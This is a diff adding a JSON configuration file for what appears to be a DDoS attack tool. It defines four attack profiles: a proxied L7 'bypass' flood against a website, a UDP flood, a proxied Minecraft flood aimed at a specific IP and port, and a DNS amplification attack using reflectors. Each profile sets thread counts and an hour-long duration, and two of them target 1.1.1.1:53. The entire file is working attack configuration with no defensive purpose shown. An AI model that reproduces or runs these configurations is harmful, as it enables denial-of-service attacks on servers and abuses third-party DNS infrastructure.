@@ -1,0 +1,40 @@
+{
+    "DDoS Config WebSite": {
+        "method": "bypass",
+        "target": "https://example.com",
+        "socks_type": "5",
+        "threads": "400",
+        "proxylist": "socks5.txt",
+        "rpc": "100",
+        "duration": "3600",
+        "debug": "true",
+        "type": "L7"
+    },
+    "DDoS Config UDP": {
+        "method": "udp",
+        "target": "1.1.1.1:53",
+        "threads": "1",
+        "duration": "3600",
+        "debug": "true",
+        "type": "L4"
+    },
+    "DDoS Config MC": {
+        "method": "minecraft",
+        "target": "202.189.7.119:25577",
+        "threads": "1000",
+        "duration": "3600",
+        "socks_type": "5",
+        "proxylist": "socks5.txt",
+        "debug": "true",
+        "type": "L4_proxied"
+    },
+    "DDoS Config DNS": {
+        "method": "dns",
+        "target": "1.1.1.1:53",
+        "threads": "100",
+        "duration": "3600",
+        "reflectors_file": "dns.txt",
+        "debug": "true",
+        "type": "L4_ampl"
+    }
+}
